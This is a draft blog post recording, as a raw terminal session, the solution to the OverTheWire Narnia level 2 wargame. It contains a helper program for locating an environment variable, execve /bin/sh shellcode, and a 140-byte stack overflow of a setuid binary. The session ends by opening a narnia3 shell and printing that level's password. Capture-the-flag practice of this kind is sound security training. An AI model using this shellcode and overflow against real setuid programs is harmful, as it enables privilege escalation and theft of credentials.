+++
title = "Over the wire - narnia02"
description = "Over the wire - narnia02"
date ="2016-03-09"
draft = true
publishdate ="2016-03-09"
categories = ["security"]
tags = ["assembly", "linux", "binary"]
slug =  "over-the-wire-narnia-02"
project_url = "https://greyhat.dk/over-the-wire-narnia-02"
type = "post"
+++



narnia2@melinda:/tmp$ cd d10
narnia2@melinda:/tmp/d10$ cat << EOF > getenv.c
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> int main(int argc, char *argv[]) {
>         char *ptr;
>         if(argc < 3) {
>                 printf("Usage: %s <environment var> <target program name>\n", argv[0]);
>                 exit(0);
>         }
>         ptr = getenv(argv[1]); /* Get env var location. */
>         ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* Adjust for program name. */
>         printf("%s will be at %p\n", argv[1], ptr);
> }
> EOF
narnia2@melinda:/tmp/d10$ gcc getenv.c -o getenv
narnia2@melinda:/tmp/d10$ export EGG=$(python -c 'print "\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80"')
narnia2@melinda:/tmp/d10$ ./getenv EGG /narnia/narnia2
EGG will be at 0x7fffffffe922
narnia2@melinda:/tmp/d10$ file /narnia/narnia2
/narnia/narnia2: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=04d7450c01ac187b9bc8a55e19cbe81fe1eed7b1, not stripped
narnia2@melinda:/tmp/d10$ gcc -m32 getenv.c -o getenv
narnia2@melinda:/tmp/d10$ ./getenv EGG /narnia/narnia2
EGG will be at 0xffffd922
narnia2@melinda:/tmp/d10$ /narnia/narnia2 $(python -c 'print "A"*140 + "\x22\xd9\xff\xff")
> ^C
narnia2@melinda:/tmp/d10$ /narnia/narnia2 $(python -c 'print "A"*140 + "\x22\xd9\xff\xff"')
$ whoami
narnia3
$ /etc/narnia_pass/narnia3
/bin//sh: 2: /etc/narnia_pass/narnia3: Permission denied
$ cat /etc/narnia_pass/narnia3
vaequeezee
